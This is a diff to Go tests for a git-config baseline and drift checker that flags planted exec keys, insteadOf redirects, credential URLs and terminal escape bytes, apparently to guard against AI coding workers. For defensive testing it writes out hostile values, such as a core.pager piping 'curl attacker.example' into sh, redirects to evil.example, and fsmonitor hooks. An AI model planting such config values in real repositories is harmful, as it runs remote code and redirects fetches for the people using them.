@@ -2,7 +2,9 @@ package gitguard
 
 import (
 	"bytes"
+	"io"
 	"os"
+	"path/filepath"
 	"slices"
 	"strings"
 	"testing"
@@ -55,6 +57,15 @@ func TestRunBaselineAcceptNeedsTerminal(t *testing.T) {
 	if _, err := os.Stat(r.baseline()); err == nil {
 		t.Fatal("a refused --accept wrote the baseline")
 	}
+	// #585: with a baseline on disk the same refusal must not widen it.
+	r.init(t)
+	before := readFile(t, r.baseline())
+	r.config(t, "core.fsmonitor", "x")
+	runBaseline(r.main, false, "yes\n", true).
+		want(t, 1, "", "crew: git-baseline --accept needs your own terminal (not Claude Code's ! prefix)\n")
+	if got := readFile(t, r.baseline()); got != before {
+		t.Fatalf("baseline changed: %q, want %q", got, before)
+	}
 }
 
 func TestRunBaselineNotInRepo(t *testing.T) {
@@ -65,8 +76,14 @@ func TestRunBaselineNotInRepo(t *testing.T) {
 
 func TestRunBaselineMissing(t *testing.T) {
 	r := newRepo(t)
+	r.config(t, "core.fsmonitor", "x")
 	runBaseline(r.main, false, "", false).want(t, 1, "",
 		"git-config baseline "+r.baseline()+": none yet — the next dispatch records it, or run `crew git-baseline --accept` from your own terminal\n")
+	// #557: only a dispatch records a missing baseline (TOFU before any worker
+	// of the crew exists); a later review run must not trust what is there now.
+	if _, err := os.Stat(r.baseline()); err == nil {
+		t.Fatal("listing a missing baseline recorded one")
+	}
 }
 
 func TestRunBaselineNoDrift(t *testing.T) {
@@ -94,7 +111,7 @@ func TestRunBaselinePredatesNoteBeforePairs(t *testing.T) {
 	r.config(t, "core.pager", "less")
 	r.config(t, "core.fsmonitor", "x")
 	runBaseline(r.main, false, "", false).want(t, 1,
-		"git-config baseline "+r.baseline()+" predates redirect-key coverage — the next dispatch records the redirect keys present then, or --accept does\n"+
+		predatesNote(r.baseline())+
 			driftLine("core.fsmonitor=x", "main checkout", r.common+"/config"), "")
 }
 
@@ -113,11 +130,14 @@ func TestRunBaselineLegacy(t *testing.T) {
 	r := newRepo(t)
 	r.init(t)
 	writeFile(t, r.common+"/remotes/foo", "URL: https://h.example/r\n")
+	mustDo(t, os.Symlink("/etc/hostname", r.common+"/remotes/link"))
 	if err := os.MkdirAll(r.common+"/branches/d", 0o755); err != nil {
 		t.Fatal(err)
 	}
+	// #993: the exact stdout is what proves a legacy listing never says "no drift".
 	runBaseline(r.main, false, "", false).want(t, 1,
 		"legacy file entry "+Quote(r.common+"/remotes/foo")+": new or changed from the baseline"+legacyTail+
+			"legacy symlink entry "+Quote(r.common+"/remotes/link")+": unsafe"+legacyTail+
 			"legacy directory entry "+Quote(r.common+"/branches/d")+": unsafe"+legacyTail, "")
 }
 
@@ -140,7 +160,7 @@ func TestRunBaselineAcceptYesMerges(t *testing.T) {
 	r.config(t, "core.pager", "less")
 	r.config(t, "core.fsmonitor", "x")
 	r.config(t, "core.editor", "vi")
-	note := "git-config baseline " + r.baseline() + " predates redirect-key coverage — the next dispatch records the redirect keys present then, or --accept does\n"
+	note := predatesNote(r.baseline())
 	origin := r.common + "/config"
 	// read -r: surrounding blanks trimmed, a final line without a newline still read.
 	runBaseline(r.main, true, " yes\t", true).want(t, 0,
@@ -161,6 +181,7 @@ func TestRunBaselineAcceptEmpty(t *testing.T) {
 	if got := readFile(t, r.baseline()); got != RedirectMark+"\x00" {
 		t.Fatalf("baseline %q, want the marker only", got)
 	}
+	runBaseline(r.main, false, "", false).want(t, 0, noDrift(r.baseline()), "")
 }
 
 func TestRunBaselineAcceptRefusesLegacy(t *testing.T) {
@@ -169,6 +190,7 @@ func TestRunBaselineAcceptRefusesLegacy(t *testing.T) {
 	before := readFile(t, r.baseline())
 	r.config(t, "core.fsmonitor", "x")
 	writeFile(t, r.common+"/remotes/foo", "URL: https://h.example/r\n")
+	// #993: the refusal lands before the prompt — stdout carries no `type yes`.
 	runBaseline(r.main, true, "yes\n", true).want(t, 1,
 		driftLine("core.fsmonitor=x", "main checkout", r.common+"/config")+
 			"legacy file entry "+Quote(r.common+"/remotes/foo")+": new or changed from the baseline"+legacyTail,
@@ -176,6 +198,9 @@ func TestRunBaselineAcceptRefusesLegacy(t *testing.T) {
 	if got := readFile(t, r.baseline()); got != before {
 		t.Fatalf("baseline changed: %q, want %q", got, before)
 	}
+	r.config(t, "--unset", "core.fsmonitor")
+	mustDo(t, os.Remove(r.common+"/remotes/foo"))
+	runBaseline(r.main, false, "", false).want(t, 0, noDrift(r.baseline()), "")
 }
 
 func TestRunBaselineAcceptNeverWritesLegacyMark(t *testing.T) {
@@ -193,9 +218,28 @@ func TestRunBaselineAcceptNeverWritesLegacyMark(t *testing.T) {
 
 func TestRunBaselinePinRefuses(t *testing.T) {
 	r := newRepo(t)
-	plantRedirect(t, r, true)
+	r.init(t)
+	before := readFile(t, r.baseline())
+	// The planted common dir baselines its own exec key: only the pin can
+	// refuse it, and nothing it names may run (#993).
+	sentinel, hit := filepath.Join(r.root, "SENTINEL"), filepath.Join(r.root, "hit.sh")
+	writeFile(t, hit, "#!/bin/sh\ntouch "+sentinel+"\ncat\n")
+	mustDo(t, os.Chmod(hit, 0o755))
+	evil := plantRedirect(t, r, false)
+	run(t, evil, "config", "core.fsmonitor", hit)
+	if _, err := capture(func(w io.Writer) error { return Init(evil, w) }); err != nil {
+		t.Fatal(err)
+	}
 	runBaseline(r.main, false, "", false).want(t, 1, "", redirectLine(r.common))
+	// #993: --accept refuses on the pin too, leaving the recorded baseline
+	// byte-identical.
 	runBaseline(r.main, true, "yes\n", true).want(t, 1, "", redirectLine(r.common))
+	if got := readFile(t, r.baseline()); got != before {
+		t.Fatalf("baseline changed: %q, want %q", got, before)
+	}
+	if _, err := os.Stat(sentinel); err == nil {
+		t.Fatal("the planted exec key ran")
+	}
 }
 
 func TestRunBaselinePinRefusesRewrittenAdmin(t *testing.T) {
@@ -216,5 +260,357 @@ func TestRunBaselineListingFailure(t *testing.T) {
 	got := runBaseline(r.main, false, "", false)
 	if got.code != 1 || got.stdout != "" || !strings.HasSuffix(got.stderr, "crew: cannot list the git config of "+r.common+"\n") {
 		t.Fatalf("exit %d, stdout %q, stderr %q", got.code, got.stdout, got.stderr)
+	}
+}
+
+// #628: relative and absolute .git/hooks are one baselined dir, either way
+// round; anything else the value names is drift.
+func TestRunBaselineHooksPathCanonicalized(t *testing.T) {
+	r := newRepo(t)
+	abs := r.common + "/hooks"
+	r.config(t, "core.hookspath", abs)
+	r.reseed(t)
+	r.config(t, "core.hookspath", ".git/hooks")
+	runBaseline(r.main, false, "", false).want(t, 0, noDrift(r.baseline()), "")
+	r.reseed(t)
+	r.config(t, "core.hookspath", abs)
+	runBaseline(r.main, false, "", false).want(t, 0, noDrift(r.baseline()), "")
+	r.config(t, "core.hookspath", ".git/hooks-evil")
+	runBaseline(r.main, false, "", false).want(t, 1,
+		driftLine("core.hookspath=.git/hooks-evil", "main checkout", r.common+"/config"), "")
+}
+
+// #557: a raw ESC/CR in a key or value prints escaped — it could otherwise
+// redraw the terminal and disguise what drifted.
+func TestRunBaselineEscapesWorkerBytes(t *testing.T) {
+	r := newRepo(t)
+	r.init(t)
+	const value = "evil\x1b[2K\rcat"
+	const key = "filter.a\x1b[2Kb.smudge"
+	r.config(t, "filter.x.clean", value)
+	r.config(t, key, "cat")
+	got := runBaseline(r.main, false, "", false)
+	got.want(t, 1,
+		driftLine("filter.x.clean="+Quote(value), "main checkout", r.common+"/config")+
+			driftLine(Quote(key)+"=cat", "main checkout", r.common+"/config"), "")
+	if strings.ContainsAny(got.stdout+got.stderr, "\x1b\r") {
+		t.Fatalf("raw control bytes reached the terminal: %q", got.stdout+got.stderr)
+	}
+}
+
+// #585: with no baseline, --accept first shows every pair; typed no records
+// nothing at all, typed yes records exactly what it showed.
+func TestRunBaselineAcceptWithoutBaseline(t *testing.T) {
+	const value = "/tmp/hit.sh"
+	r := newRepo(t)
+	r.config(t, "core.sshcommand", value)
+	line := driftLine("core.sshcommand="+value, "main checkout", r.common+"/config")
+	runBaseline(r.main, true, "no\n", true).want(t, 1, line+prompt(r.baseline()), "crew: baseline unchanged\n")
+	if _, err := os.Stat(r.baseline()); err == nil {
+		t.Fatal("typed no recorded a baseline")
+	}
+	runBaseline(r.main, true, "yes\n", true).want(t, 0,
+		line+prompt(r.baseline())+"git-config baseline "+r.baseline()+": accepted\n", "")
+	if got := readFile(t, r.baseline()); got != RedirectMark+"\x00core.sshcommand\n"+value+"\x00" {
+		t.Fatalf("baseline %q", got)
+	}
+	runBaseline(r.main, false, "", false).want(t, 0, noDrift(r.baseline()), "")
+}
+
+// The value classes as the human sees them: an exec value and any url whose
+// mask would hide the endpoint print whole; URL credentials print masked with
+// a fingerprint, keeping the host visible.
+func TestRunBaselineVerbatimAndMaskedValues(t *testing.T) {
+	const (
+		tokenURL    = "https://x-access-token:FAKETOKEN0686@github.com/o/r.git"
+		proxyURL    = "http://u:fakepass0686@proxy.example:3128"
+		proxyRaw    = "u:fakepass0686@proxy.example:3128"
+		redirectSub = "https://x:FAKETOKEN0686@evil.example/"
+	)
+	for _, tc := range []struct {
+		name    string
+		seed    func(t *testing.T, r repo)
+		drift   func(t *testing.T, r repo)
+		want    func(r repo) string
+		hosts   []string
+		secrets []string
+	}{
+		{
+			name:  "planted redirect",
+			drift: func(t *testing.T, r repo) { r.config(t, "url.https://evil.example/.insteadof", "https://github.com/") },
+			want: func(r repo) string {
+				return driftLine("url.https://evil.example/.insteadof=https://github.com/", "main checkout", r.common+"/config")
+			},
+			hosts: []string{"evil.example"},
+		},
+		{
+			name: "exec value: the payload before an @ stays visible",
+			drift: func(t *testing.T, r repo) {
+				r.config(t, "core.pager", "curl -s attacker.example|sh;: a@less")
+			},
+			want: func(r repo) string {
+				return driftLine("core.pager="+Quote("curl -s attacker.example|sh;: a@less"), "main checkout", r.common+"/config")
+			},
+			hosts: []string{"attacker.example"},
+		},
+		{
+			name: "exec value that looks like a URL",
+			drift: func(t *testing.T, r repo) {
+				r.config(t, "core.pager", "x://curl attacker.example|sh;:@less")
+			},
+			want: func(r repo) string {
+				return driftLine("core.pager="+Quote("x://curl attacker.example|sh;:@less"), "main checkout", r.common+"/config")
+			},
+			hosts: []string{"attacker.example"},
+		},
+		{
+			name: "bracketed ssh userinfo host stays verbatim",
+			seed: func(t *testing.T, r repo) { r.config(t, "remote.origin.url", "https://github.com/o/r.git") },
+			drift: func(t *testing.T, r repo) {
+				r.config(t, "remote.origin.url", "ssh://[evil.example]:22@github.com/o/r.git")
+			},
+			want: func(r repo) string {
+				return driftLine("remote.origin.url="+Quote("ssh://[evil.example]:22@github.com/o/r.git"), "main checkout", r.common+"/config")
+			},
+			hosts: []string{"evil.example"},
+		},
+		{
+			name: "scp-style remote url stays raw",
+			seed: func(t *testing.T, r repo) { r.config(t, "remote.origin.url", "https://github.com/o/r.git") },
+			drift: func(t *testing.T, r repo) {
+				r.config(t, "remote.origin.url", "attacker.example:x@github.com:o/r.git")
+			},
+			want: func(r repo) string {
+				return driftLine("remote.origin.url=attacker.example:x@github.com:o/r.git", "main checkout", r.common+"/config")
+			},
+			hosts: []string{"attacker.example"},
+		},
+		{
+			name:  "scheme-less http.proxy",
+			drift: func(t *testing.T, r repo) { r.config(t, "http.proxy", proxyRaw) },
+			want: func(r repo) string {
+				return driftLine("http.proxy="+fingerprinted("***@proxy.example:3128", proxyRaw), "main checkout", r.common+"/config")
+			},
+			hosts:   []string{"proxy.example"},
+			secrets: []string{"fakepass0686"},
+		},
+		{
+			name: "credentials masked in values and in redirect keys, hosts kept",
+			drift: func(t *testing.T, r repo) {
+				r.config(t, "remote.origin.url", tokenURL)
+				r.config(t, "http.proxy", proxyURL)
+				r.config(t, "http.https://p.example/.proxy", proxyRaw)
+				r.config(t, "url."+redirectSub+".insteadof", "https://github.com/")
+			},
+			want: func(r repo) string {
+				origin := r.common + "/config"
+				return driftLine("remote.origin.url="+fingerprinted("https://***@github.com/o/r.git", tokenURL), "main checkout", origin) +
+					driftLine("http.proxy="+fingerprinted("http://***@proxy.example:3128", proxyURL), "main checkout", origin) +
+					driftLine("http.https://p.example/.proxy="+fingerprinted("***@proxy.example:3128", proxyRaw), "main checkout", origin) +
+					driftLine("url."+fingerprinted("https://***@evil.example/", redirectSub)+
+						".insteadof=https://github.com/", "main checkout", origin)
+			},
+			hosts:   []string{"github.com", "proxy.example", "evil.example"},
+			secrets: []string{"FAKETOKEN0686", "fakepass0686"},
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			r := newRepo(t)
+			if tc.seed != nil {
+				tc.seed(t, r)
+			}
+			r.init(t)
+			tc.drift(t, r)
+			got := runBaseline(r.main, false, "", false)
+			got.want(t, 1, tc.want(r), "")
+			for _, host := range tc.hosts {
+				if !strings.Contains(got.stdout, host) {
+					t.Errorf("the host %s vanished from:\n%s", host, got.stdout)
+				}
+			}
+			for _, secret := range tc.secrets {
+				if strings.Contains(got.stdout+got.stderr, secret) {
+					t.Errorf("%s reached the screen:\n%s", secret, got.stdout)
+				}
+			}
+			if len(tc.secrets) > 0 && !strings.Contains(got.stdout, "sha256:") {
+				t.Errorf("a masked value printed no fingerprint:\n%s", got.stdout)
+			}
+		})
+	}
+}
+
+// #686: an insteadOf alias from any scope git reads — the main checkout's, or
+// the human's own global file — rewrites the remote url git contacts, so that
+// url prints whole rather than masked.
+func TestRunBaselineAliasFromAnyScopeRewrites(t *testing.T) {
+	const url = "https://evil.example:x@github.com/o/r.git"
+	r := newRepo(t)
+	r.init(t)
+	r.config(t, "remote.origin.url", url)
+	want := driftLine("remote.origin.url="+Quote(url), "main checkout", r.common+"/config")
+	for _, alias := range []string{"", "git@"} {
+		r.config(t, "url."+alias+".insteadof", "https://")
+		// The alias is itself drift, and it reprints the url it rewrites.
+		runBaseline(r.main, false, "", false).want(t, 1,
+			want+driftLine("url."+alias+".insteadof=https://", "main checkout", r.common+"/config")+
+				"  rewritten by the alias above: "+want, "")
+		r.config(t, "--unset", "url."+alias+".insteadof")
+	}
+	global := filepath.Join(r.root, "gitconfig")
+	writeFile(t, global, "[url \"git@\"]\n\tpushInsteadOf = https://\n")
+	t.Setenv("GIT_CONFIG_GLOBAL", global)
+	runBaseline(r.main, false, "", false).want(t, 1, want, "")
+}
+
+// #686: an alias only a linked worktree configures rewrites the main
+// checkout's remote url, so it prints whole in the main checkout's listing.
+func TestRunBaselineWorktreeAliasUnmasksMainRemote(t *testing.T) {
+	const url = "https://evil.example:x@github.com/o/r.git"
+	r := newRepo(t)
+	wt, admin := r.addWorktree(t, "alias-wt")
+	r.init(t)
+	r.config(t, "extensions.worktreeconfig", "true")
+	run(t, wt, "config", "--worktree", "url..insteadof", "https://")
+	r.config(t, "remote.origin.url", url)
+	runBaseline(r.main, false, "", false).want(t, 1,
+		driftLine("remote.origin.url="+Quote(url), "main checkout", r.common+"/config")+
+			driftLine("url..insteadof=https://", "worktree alias-wt", admin+"/config.worktree")+
+			"  rewritten by the alias above: "+driftLine("remote.origin.url="+Quote(url), "main checkout", r.common+"/config"), "")
+}
+
+// #686: an alias that lives only in the baseline still counts: git may restore
+// it, and a url it rewrites must print whole before it is ever accepted.
+func TestRunBaselineBaselinedAliasRewrites(t *testing.T) {
+	const url = "https://evil.invalid:x@trusted.invalid/o/r.git"
+	r := newRepo(t)
+	r.init(t)
+	origin := r.common + "/config"
+	accepted := "git-config baseline " + r.baseline() + ": accepted\n"
+	alias := driftLine("url.git@.insteadof=https://", "main checkout", origin)
+	r.config(t, "url.git@.insteadof", "https://")
+	runBaseline(r.main, true, "yes\n", true).want(t, 0, alias+prompt(r.baseline())+accepted, "")
+	r.config(t, "--unset", "url.git@.insteadof")
+	r.config(t, "remote.origin.url", url)
+	// The alias is gone from the config; the baselined alias still rewrites.
+	runBaseline(r.main, false, "", false).want(t, 1,
+		driftLine("remote.origin.url="+Quote(url), "main checkout", origin), "")
+	runBaseline(r.main, true, "yes\n", true).want(t, 0,
+		driftLine("remote.origin.url="+Quote(url), "main checkout", origin)+prompt(r.baseline())+accepted, "")
+	r.config(t, "url.git@.insteadof", "https://")
+	runBaseline(r.main, false, "", false).want(t, 0, noDrift(r.baseline()), "")
+}
+
+// #686: --accept shows the masked form and stores the value in full, so the
+// next listing still recognises it as baselined.
+func TestRunBaselineAcceptMasksScreenStoresFull(t *testing.T) {
+	const token = "https://x-access-token:FAKETOKEN0686@github.com/o/r.git"
+	r := newRepo(t)
+	r.init(t)
+	r.config(t, "remote.origin.url", token)
+	got := runBaseline(r.main, true, "yes\n", true)
+	got.want(t, 0,
+		driftLine("remote.origin.url="+fingerprinted("https://***@github.com/o/r.git", token), "main checkout", r.common+"/config")+
+			prompt(r.baseline())+"git-config baseline "+r.baseline()+": accepted\n", "")
+	if strings.Contains(got.stdout, "FAKETOKEN0686") {
+		t.Fatalf("the token reached the screen:\n%s", got.stdout)
+	}
+	if !strings.Contains(got.stdout, "github.com") || !strings.Contains(got.stdout, "sha256:") {
+		t.Fatalf("the host or its fingerprint vanished:\n%s", got.stdout)
+	}
+	stored := readFile(t, r.baseline())
+	if !strings.Contains(stored, token) {
+		t.Fatalf("the baseline does not store the value in full: %q", stored)
+	}
+	runBaseline(r.main, false, "", false).want(t, 0, noDrift(r.baseline()), "")
+}
+
+// #678: a baseline that predates redirect-key coverage says so before the
+// pairs it now lists.
+func TestRunBaselinePredatesNoteListsRedirectPair(t *testing.T) {
+	r := newRepo(t)
+	writeFile(t, r.baseline(), "")
+	r.config(t, "remote.origin.url", "https://x.example/r.git")
+	runBaseline(r.main, false, "", false).want(t, 1, predatesNote(r.baseline())+
+		driftLine("remote.origin.url=https://x.example/r.git", "main checkout", r.common+"/config"), "")
+}
+
+// #678: --accept records the redirect marker, so the note never comes back.
+func TestRunBaselineAcceptRecordsRedirectMark(t *testing.T) {
+	r := newRepo(t)
+	writeFile(t, r.baseline(), "")
+	r.config(t, "remote.origin.url", "https://x.example/r.git")
+	runBaseline(r.main, true, "yes\n", true).want(t, 0,
+		predatesNote(r.baseline())+
+			driftLine("remote.origin.url=https://x.example/r.git", "main checkout", r.common+"/config")+
+			prompt(r.baseline())+"git-config baseline "+r.baseline()+": accepted\n", "")
+	recs, err := ReadBaseline(r.baseline())
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !slices.Contains(recs, RedirectMark) {
+		t.Fatalf("baseline %q has no redirect mark", recs)
+	}
+	runBaseline(r.main, false, "", false).want(t, 0, noDrift(r.baseline()), "")
+}
+
+// #585: a baseline of one lone NUL is an empty record, not a pair; --accept
+// repairs it without leaving any empty record behind.
+func TestRunBaselineAcceptRepairsLoneNUL(t *testing.T) {
+	r := newRepo(t)
+	writeFile(t, r.baseline(), "\x00")
+	r.config(t, "core.fsmonitor", "x")
+	runBaseline(r.main, true, "yes\n", true).want(t, 0,
+		predatesNote(r.baseline())+driftLine("core.fsmonitor=x", "main checkout", r.common+"/config")+
+			prompt(r.baseline())+"git-config baseline "+r.baseline()+": accepted\n", "")
+	recs, err := ReadBaseline(r.baseline())
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, rec := range recs {
+		if rec == "" {
+			t.Fatalf("baseline %q still holds an empty record", recs)
+		}
+	}
+	for _, want := range []string{RedirectMark, "core.fsmonitor\nx"} {
+		if !slices.Contains(recs, want) {
+			t.Fatalf("baseline %q lacks %q", recs, want)
+		}
+	}
+}
+
+// #585: --accept writes the pairs it displayed, never a re-listing: a key
+// planted after the last listing must not be laundered into the baseline.
+func TestRunBaselineAcceptWritesOnlyShownPairs(t *testing.T) {
+	r := newRepo(t)
+	r.addWorktree(t, "w")
+	r.init(t)
+	count := filepath.Join(r.root, "ctr")
+	shimPlantGit(t, r.main, count)
+	got := runBaseline(r.main, true, "yes\n", true)
+	if got.code != 0 {
+		t.Fatalf("exit %d, stdout %q, stderr %q", got.code, got.stdout, got.stderr)
+	}
+	recs, err := ReadBaseline(r.baseline())
+	if err != nil {
+		t.Fatal(err)
+	}
+	// The shim plants once per listing: only a value this run displayed may be
+	// recorded.
+	var planted int
+	for _, rec := range recs {
+		if k, v, ok := strings.Cut(rec, "\n"); ok && k == "core.fsmonitor" {
+			if !strings.Contains(got.stdout, "core.fsmonitor="+v) {
+				t.Fatalf("recorded a pair it never displayed: %q\n%s", rec, got.stdout)
+			}
+			planted++
+		}
+	}
+	if planted == 0 {
+		t.Fatalf("the planted key was never recorded, so the run listed once: %q", recs)
+	}
+	last := strings.TrimSpace(readFile(t, count))
+	if slices.Contains(recs, "core.fsmonitor\n/evil"+last) {
+		t.Fatalf("the key planted after the last listing was recorded: %q", recs)
 	}
 }
